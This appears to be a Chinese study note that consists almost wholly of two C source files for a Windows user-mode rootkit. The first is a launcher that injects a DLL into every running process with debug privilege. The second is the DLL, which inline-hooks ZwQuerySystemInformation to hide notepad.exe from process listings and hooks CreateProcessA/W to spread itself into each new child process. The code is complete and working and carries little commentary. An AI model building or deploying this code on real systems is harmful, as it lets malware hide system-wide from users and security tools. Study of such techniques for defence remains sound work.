# 隐藏进程(API勾取---修改API代码---关注现有进程和以后会产生的进程---全局API勾取)

HideProc2.cpp  
```c

#include "windows.h"
#include "stdio.h"
#include "tlhelp32.h"
#include "tchar.h"

enum {INJECTION_MODE = 0, EJECTION_MODE};

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) 
{
    TOKEN_PRIVILEGES tp;
    HANDLE hToken;
    LUID luid;

    if( !OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, 
			              &hToken) )
    {
        printf("OpenProcessToken error: %u\n", GetLastError());
        return FALSE;
    }

    if( !LookupPrivilegeValue(NULL,            // lookup privilege on local system
                              lpszPrivilege,   // privilege to lookup 
                              &luid) )         // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError() ); 
        return FALSE; 
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if( bEnablePrivilege )
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.
    if( !AdjustTokenPrivileges(hToken, 
                               FALSE, 
                               &tp, 
                               sizeof(TOKEN_PRIVILEGES), 
                               (PTOKEN_PRIVILEGES) NULL, 
                               (PDWORD) NULL) )
    { 
        printf("AdjustTokenPrivileges error: %u\n", GetLastError() ); 
        return FALSE; 
    } 

    if( GetLastError() == ERROR_NOT_ALL_ASSIGNED )
    {
        printf("The token does not have the specified privilege. \n");
        return FALSE;
    } 

    return TRUE;
}

BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)
{
	HANDLE                  hProcess, hThread;
	LPVOID                  pRemoteBuf;
	DWORD                   dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);
	LPTHREAD_START_ROUTINE  pThreadProc;

	if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )
    {
        printf("OpenProcess(%d) failed!!!\n", dwPID);
		return FALSE;
    }

	pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, 
                                MEM_COMMIT, PAGE_READWRITE);

	WriteProcessMemory(hProcess, pRemoteBuf, 
                       (LPVOID)szDllPath, dwBufSize, NULL);

	pThreadProc = (LPTHREAD_START_ROUTINE)
                  GetProcAddress(GetModuleHandle(L"kernel32.dll"), 
                                 "LoadLibraryW");
	hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                 pThreadProc, pRemoteBuf, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);	

	VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return TRUE;
}

BOOL EjectDll(DWORD dwPID, LPCTSTR szDllPath)
{
	BOOL                    bMore = FALSE, bFound = FALSE;
	HANDLE                  hSnapshot, hProcess, hThread;
	MODULEENTRY32           me = { sizeof(me) };
	LPTHREAD_START_ROUTINE  pThreadProc;

	if( INVALID_HANDLE_VALUE == 
        (hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID)) )
		return FALSE;

	bMore = Module32First(hSnapshot, &me);
	for( ; bMore ; bMore = Module32Next(hSnapshot, &me) )
	{
		if( !_tcsicmp(me.szModule, szDllPath) || 
            !_tcsicmp(me.szExePath, szDllPath) )
		{
			bFound = TRUE;
			break;
		}
	}

	if( !bFound )
	{
		CloseHandle(hSnapshot);
		return FALSE;
	}

	if( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )
	{
		printf("OpenProcess(%d) failed!!!\n", dwPID);
		CloseHandle(hSnapshot);
		return FALSE;
	}

	pThreadProc = (LPTHREAD_START_ROUTINE)
                  GetProcAddress(GetModuleHandle(L"kernel32.dll"), 
                                 "FreeLibrary");
	hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                 pThreadProc, me.modBaseAddr, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);	

	CloseHandle(hThread);
	CloseHandle(hProcess);
	CloseHandle(hSnapshot);

	return TRUE;
}

BOOL InjectAllProcess(int nMode, LPCTSTR szDllPath)
{
	DWORD                   dwPID = 0;
	HANDLE                  hSnapShot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32          pe;

	// Get the snapshot of the system
	pe.dwSize = sizeof( PROCESSENTRY32 );
	hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL );

	// find process
	Process32First(hSnapShot, &pe);
	do
	{
		dwPID = pe.th32ProcessID;

        // 鉴于系统安全性的考虑
        // 对于PID小于100的系统进程
        // 不执行DLL注入操作
		if( dwPID < 100 )
			continue;

        if( nMode == INJECTION_MODE )
		    InjectDll(dwPID, szDllPath);
        else
            EjectDll(dwPID, szDllPath);
	} while( Process32Next(hSnapShot, &pe) );

	CloseHandle(hSnapShot);

	return TRUE;
}

int _tmain(int argc, TCHAR* argv[])
{
    int nMode = INJECTION_MODE;

	if( argc != 3 )
	{
		printf("\n Usage  : HideProc2.exe <-hide|-show> <dll path>\n\n");
		return 1;
	}

	// change privilege
	SetPrivilege(SE_DEBUG_NAME, TRUE);

    // Inject(Eject) Dll to all process
    if( !_tcsicmp(argv[1], L"-show") )
	    nMode = EJECTION_MODE;

    InjectAllProcess(nMode, argv[2]);

	return 0;
}

```


stealth2.cpp  
```c

#include "windows.h"
#include "stdio.h"
#include "tchar.h"

#define STR_MODULE_NAME					(L"stealth2.dll")
#define STR_HIDE_PROCESS_NAME			(L"notepad.exe")
#define STATUS_SUCCESS					(0x00000000L) 

typedef LONG NTSTATUS;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemProcessorPerformanceInformation = 8,
    SystemInterruptInformation = 23,
    SystemExceptionInformation = 33,
    SystemRegistryQuotaInformation = 37,
    SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    BYTE Reserved1[52];
    PVOID Reserved2[3];
    HANDLE UniqueProcessId;
    PVOID Reserved3;
    ULONG HandleCount;
    BYTE Reserved4[4];
    PVOID Reserved5[11];
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved6[6];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS (WINAPI *PFZWQUERYSYSTEMINFORMATION)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass, 
    PVOID SystemInformation, 
    ULONG SystemInformationLength, 
    PULONG ReturnLength);

typedef BOOL (WINAPI *PFCREATEPROCESSA)(
    LPCTSTR lpApplicationName,
    LPTSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCTSTR lpCurrentDirectory,
    LPSTARTUPINFO lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

typedef BOOL (WINAPI *PFCREATEPROCESSW)(
    LPCTSTR lpApplicationName,
    LPTSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCTSTR lpCurrentDirectory,
    LPSTARTUPINFO lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

BYTE g_pOrgCPA[5] = {0,};
BYTE g_pOrgCPW[5] = {0,};
BYTE g_pOrgZwQSI[5] = {0,};

BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)
{
	FARPROC pFunc;
	DWORD dwOldProtect, dwAddress;
	BYTE pBuf[5] = {0xE9, 0, };
	PBYTE pByte;

	pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pFunc;
	if( pByte[0] == 0xE9 )
		return FALSE;

	VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	memcpy(pOrgBytes, pFunc, 5);

	dwAddress = (DWORD)pfnNew - (DWORD)pFunc - 5;
	memcpy(&pBuf[1], &dwAddress, 4);

	memcpy(pFunc, pBuf, 5);

	VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

	return TRUE;
}

BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)
{
	FARPROC pFunc;
	DWORD dwOldProtect;
	PBYTE pByte;

	pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pFunc;
	if( pByte[0] != 0xE9 )
		return FALSE;

	VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	memcpy(pFunc, pOrgBytes, 5);

	VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

	return TRUE;
}

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) 
{
    TOKEN_PRIVILEGES tp;
    HANDLE hToken;
    LUID luid;

    if( !OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, 
			              &hToken) )
    {
        printf("OpenProcessToken error: %u\n", GetLastError());
        return FALSE;
    }

    if( !LookupPrivilegeValue(NULL,             // lookup privilege on local system
                              lpszPrivilege,    // privilege to lookup 
                              &luid) )          // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError() ); 
        return FALSE; 
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if( bEnablePrivilege )
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.
    if( !AdjustTokenPrivileges(hToken, 
                               FALSE, 
                               &tp, 
                               sizeof(TOKEN_PRIVILEGES), 
                               (PTOKEN_PRIVILEGES) NULL, 
                               (PDWORD) NULL) )
    { 
        printf("AdjustTokenPrivileges error: %u\n", GetLastError() ); 
        return FALSE; 
    } 

    if( GetLastError() == ERROR_NOT_ALL_ASSIGNED )
    {
        printf("The token does not have the specified privilege. \n");
        return FALSE;
    } 

    return TRUE;
}

BOOL InjectDll2(HANDLE hProcess, LPCTSTR szDllName)
{
	HANDLE hThread;
	LPVOID pRemoteBuf;
	DWORD dwBufSize = (DWORD)(_tcslen(szDllName) + 1) * sizeof(TCHAR);
	FARPROC pThreadProc;

	pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, 
                                MEM_COMMIT, PAGE_READWRITE);
    if( pRemoteBuf == NULL )
        return FALSE;

	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllName, 
                       dwBufSize, NULL);

	pThreadProc = GetProcAddress(GetModuleHandleA("kernel32.dll"), 
                                 "LoadLibraryW");
	hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                 (LPTHREAD_START_ROUTINE)pThreadProc, 
                                 pRemoteBuf, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);	

	VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);

	CloseHandle(hThread);

	return TRUE;
}

NTSTATUS WINAPI NewZwQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass, 
	PVOID SystemInformation, 
	ULONG SystemInformationLength, 
	PULONG ReturnLength)
{
	NTSTATUS status;
	FARPROC pFunc;
	PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
	char szProcName[MAX_PATH] = {0,};

	unhook_by_code("ntdll.dll", "ZwQuerySystemInformation", g_pOrgZwQSI);

	pFunc = GetProcAddress(GetModuleHandleA("ntdll.dll"), 
                           "ZwQuerySystemInformation");
	status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)
             (SystemInformationClass, SystemInformation, 
              SystemInformationLength, ReturnLength);

	if( status != STATUS_SUCCESS )
		goto __NTQUERYSYSTEMINFORMATION_END;

	if( SystemInformationClass == SystemProcessInformation )
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

		while(TRUE)
		{
            if(pCur->Reserved2[1] != NULL)
            {
                if(!_tcsicmp((PWSTR)pCur->Reserved2[1], STR_HIDE_PROCESS_NAME))
			    {
				    if(pCur->NextEntryOffset == 0)
					    pPrev->NextEntryOffset = 0;
				    else
					    pPrev->NextEntryOffset += pCur->NextEntryOffset;
			    }
			    else		
				    pPrev = pCur;	// 找不到相应进程，将 pPrev 后移
            }

			if(pCur->NextEntryOffset == 0)
				break;

			pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur->NextEntryOffset);
		}
	}

__NTQUERYSYSTEMINFORMATION_END:

	hook_by_code("ntdll.dll", "ZwQuerySystemInformation", 
                 (PROC)NewZwQuerySystemInformation, g_pOrgZwQSI);

	return status;
}

BOOL WINAPI NewCreateProcessA(
    LPCTSTR lpApplicationName,
    LPTSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCTSTR lpCurrentDirectory,
    LPSTARTUPINFO lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
)
{
    BOOL bRet;
    FARPROC pFunc;

    // unhook
    unhook_by_code("kernel32.dll", "CreateProcessA", g_pOrgCPA);

    // 调用原始API
    pFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessA");
    bRet = ((PFCREATEPROCESSA)pFunc)(lpApplicationName,
                                     lpCommandLine,
                                     lpProcessAttributes,
                                     lpThreadAttributes,
                                     bInheritHandles,
                                     dwCreationFlags,
                                     lpEnvironment,
                                     lpCurrentDirectory,
                                     lpStartupInfo,
                                     lpProcessInformation);

    // 向生成的子进程注入 stealth2.dll
    if( bRet )
        InjectDll2(lpProcessInformation->hProcess, STR_MODULE_NAME);

    // hook
    hook_by_code("kernel32.dll", "CreateProcessA", 
                 (PROC)NewCreateProcessA, g_pOrgCPA);

    return bRet;
}

BOOL WINAPI NewCreateProcessW(
    LPCTSTR lpApplicationName,
    LPTSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCTSTR lpCurrentDirectory,
    LPSTARTUPINFO lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
)
{
    BOOL bRet;
    FARPROC pFunc;

    // unhook
    unhook_by_code("kernel32.dll", "CreateProcessW", g_pOrgCPW);

    // 调用原始API
    pFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessW");
    bRet = ((PFCREATEPROCESSW)pFunc)(lpApplicationName,
                                     lpCommandLine,
                                     lpProcessAttributes,
                                     lpThreadAttributes,
                                     bInheritHandles,
                                     dwCreationFlags,
                                     lpEnvironment,
                                     lpCurrentDirectory,
                                     lpStartupInfo,
                                     lpProcessInformation);

    // 向生成的子进程注入 stealth2.dll
    if( bRet )
        InjectDll2(lpProcessInformation->hProcess, STR_MODULE_NAME);

    // hook
    hook_by_code("kernel32.dll", "CreateProcessW", 
                (PROC)NewCreateProcessW, g_pOrgCPW);

    return bRet;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    char            szCurProc[MAX_PATH] = {0,};
    char            *p = NULL;

    // 异常处理 若当前进程为 HookProc.exe, 则终止，不进行勾取操作
    GetModuleFileNameA(NULL, szCurProc, MAX_PATH);
    p = strrchr(szCurProc, '\\');
    if( (p != NULL) && !_stricmp(p+1, "HideProc2.exe") )
        return TRUE;

    // change privilege
    SetPrivilege(SE_DEBUG_NAME, TRUE);

    switch( fdwReason )
    {
        case DLL_PROCESS_ATTACH : 
            // hook
            hook_by_code("kernel32.dll", "CreateProcessA", 
                         (PROC)NewCreateProcessA, g_pOrgCPA);
            hook_by_code("kernel32.dll", "CreateProcessW", 
                         (PROC)NewCreateProcessW, g_pOrgCPW);
            hook_by_code("ntdll.dll", "ZwQuerySystemInformation", 
                         (PROC)NewZwQuerySystemInformation, g_pOrgZwQSI);
            break;

        case DLL_PROCESS_DETACH :
            // unhook
            unhook_by_code("kernel32.dll", "CreateProcessA", 
                           g_pOrgCPA);
            unhook_by_code("kernel32.dll", "CreateProcessW", 
                           g_pOrgCPW);
            unhook_by_code("ntdll.dll", "ZwQuerySystemInformation", 
                           g_pOrgZwQSI);
            break;
    }

    return TRUE;
}

```


2019/6/2  
